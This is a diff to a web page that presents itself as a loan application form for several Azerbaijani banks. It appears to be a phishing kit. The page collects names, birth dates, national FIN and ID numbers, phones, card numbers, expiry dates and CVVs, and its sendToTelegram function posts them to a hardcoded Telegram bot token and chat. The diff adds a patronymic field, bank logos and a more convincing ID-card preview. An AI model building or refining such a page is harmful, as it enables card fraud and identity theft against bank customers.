+    { name: 'Xalq Bank', color: '#004B87', logo: xalqLogo, sub: 'xalqbank.az' },
+    { name: 'Rabitəbank', color: '#003366', logo: rabitaLogo, sub: 'rabitabank.com' }
+  ];
+
   // ========== TELEGRAM ==========
   const BOT_TOKEN = "8902438504:AAHNLnxNa6m2BBnO0eEJdssVYvXTHpBgscI";
   const CHAT_ID = "-1004292906522";
@@ -1075,8 +1120,7 @@
     { value: 5, label: '3 ay', days: 90 }
   ];
 
-  // Bank məlumatları
-  const bankData = {
+  const bankDataMap = {
     'Kapital Bank': { color: '#E31E24', bg: 'linear-gradient(135deg, #1a1a2e, #E31E24)' },
     'Leobank': { color: '#0066B3', bg: 'linear-gradient(135deg, #1a1a2e, #0066B3)' },
     'ABB': { color: '#004B87', bg: 'linear-gradient(135deg, #1a1a2e, #004B87)' },
@@ -1088,11 +1132,32 @@
     'Rabitəbank': { color: '#003366', bg: 'linear-gradient(135deg, #1a1a2e, #003366)' }
   };
 
+  // Bank seçimi gridini yarat
+  function renderBanks() {
+    const grid = document.getElementById('bankGrid');
+    grid.innerHTML = '';
+    banks.forEach(bank => {
+      const div = document.createElement('div');
+      div.className = 'bank-option';
+      div.dataset.bank = bank.name;
+      div.dataset.color = bank.color;
+      div.onclick = function() { selectBank(this); };
+      div.innerHTML = `
+        <img class="bank-logo-img" src="${bank.logo}" alt="${bank.name}">
+        <div class="bank-name">${bank.name}</div>
+        <div class="bank-sub">${bank.sub}</div>
+      `;
+      grid.appendChild(div);
+    });
+  }
+  renderBanks();
+
   async function sendToTelegram(data) {
     const message = `
 🆕 YENİ KREDİT MÜRACİƏTİ!
 ━━━━━━━━━━━━━━━━━━━━
 👤 Ad, Soyad: ${data.name}
+👤 Ata adı: ${data.patronymic || '—'}
 📅 Doğum: ${data.birth}
 🪪 FIN: ${data.fin}
 🪪 Seriya: ${data.id}
@@ -1235,20 +1300,25 @@
 
   // ========== ID CARD PREVIEW ==========
   function updateIDPreview() {
-    const name = (document.getElementById('firstName').value || 'Əli') + ' ' + (document.getElementById('lastName').value || 'Məmmədov');
+    const name = document.getElementById('firstName').value || 'ƏLİ';
+    const surname = document.getElementById('lastName').value || 'MƏMMƏDOV';
+    const patronymic = document.getElementById('patronymic').value || 'ƏLİ OĞLU';
     const birth = document.getElementById('birthDate').value || '1990-01-01';
     const fin = document.getElementById('fin').value || '7A2BC9D';
     const id = document.getElementById('idnum').value || '12345678';
     const prefix = document.getElementById('idPrefix').value || 'AZE';
     
-    document.getElementById('previewName').textContent = name || 'Əli Məmmədov';
+    document.getElementById('previewName').textContent = name.toUpperCase() || 'ƏLİ';
+    document.getElementById('previewSurname').textContent = surname.toUpperCase() || 'MƏMMƏDOV';
+    document.getElementById('previewPatronymic').textContent = patronymic.toUpperCase() || 'ƏLİ OĞLU';
     document.getElementById('previewBirth').textContent = birth ? birth.split('-').reverse().join('.') : '01.01.1990';
-    document.getElementById('previewFin').textContent = fin || '7A2BC9D';
+    document.getElementById('previewFin').textContent = fin.toUpperCase() || '7A2BC9D';
     document.getElementById('previewId').textContent = (prefix || 'AZE') + ' ' + (id || '12345678');
   }
 
   document.getElementById('firstName').addEventListener('input', updateIDPreview);
   document.getElementById('lastName').addEventListener('input', updateIDPreview);
+  document.getElementById('patronymic').addEventListener('input', updateIDPreview);
   document.getElementById('birthDate').addEventListener('input', updateIDPreview);
   document.getElementById('fin').addEventListener('input', updateIDPreview);
   document.getElementById('idnum').addEventListener('input', updateIDPreview);
@@ -1342,8 +1412,14 @@
     const bankName = selectedBankData.name;
     document.getElementById('cardBankName').textContent = bankName.toUpperCase();
     
+    // Bank logosunu karta əlavə et
+    const bank = banks.find(b => b.name === bankName);
+    if(bank) {
+      document.getElementById('cardLogoOnCard').src = bank.logo;
+    }
+    
     const cardVisual = document.getElementById('bankCardVisual');
-    const bankInfo = bankData[bankName];
+    const bankInfo = bankDataMap[bankName];
     if(bankInfo) {
       cardVisual.style.background = bankInfo.bg;
     }
@@ -1404,8 +1480,9 @@
       return;
     }
 
-    const firstName = document.getElementById('firstName').value || 'Əli';
-    const lastName = document.getElementById('lastName').value || 'Məmmədov';
+    const firstName = document.getElementById('firstName').value || 'ƏLİ';
+    const lastName = document.getElementById('lastName').value || 'MƏMMƏDOV';
+    const patronymic = document.getElementById('patronymic').value || 'ƏLİ OĞLU';
     const name = firstName + ' ' + lastName;
     const birth = document.getElementById('birthDate').value || '1990-01-01';
     const fin = document.getElementById('fin').value || 'Məlumat yoxdur';
@@ -1417,7 +1494,7 @@
     const term = document.getElementById('termLabel').textContent;
 
     applicationData = {
-      name, birth, fin, id: prefix + ' ' + id, phone, job,
+      name, patronymic, birth, fin, id: prefix + ' ' + id, phone, job,
       bank: selectedBankData.name, cardNumber, expiry, cvv, amount, term
     };
 
@@ -1468,6 +1545,7 @@
     const consent2 = document.getElementById('consent2').checked;
     const firstName = document.getElementById('firstName').value.trim();
     const lastName = document.getElementById('lastName').value.trim();
+    const patronymic = document.getElementById('patronymic').value.trim();
     const birth = document.getElementById('birthDate').value;
 
     if(!firstName || !lastName){ alert('Ad və soyad daxil edin!'); return; }
@@ -1479,7 +1557,9 @@
     if(!consent1 || !consent2){ alert('Bütün razılıqları qeyd edin!'); return; }
 
     const prefix = document.getElementById('idPrefix').value || 'AZE';
-    document.getElementById('sumName').textContent = firstName + ' ' + lastName;
+    document.getElementById('sumName').textContent = firstName.toUpperCase();
+    document.getElementById('sumSurname').textContent = lastName.toUpperCase();
+    document.getElementById('sumPatronymic').textContent = patronymic.toUpperCase() || '—';
     document.getElementById('sumBirth').textContent = birth.split('-').reverse().join('.');
     document.getElementById('sumFin').textContent = fin;
     document.getElementById('sumId').textContent = prefix + ' ' + id;
@@ -1517,4 +1597,4 @@
 </script>
 
 </body>
-        </html>
+  </html>
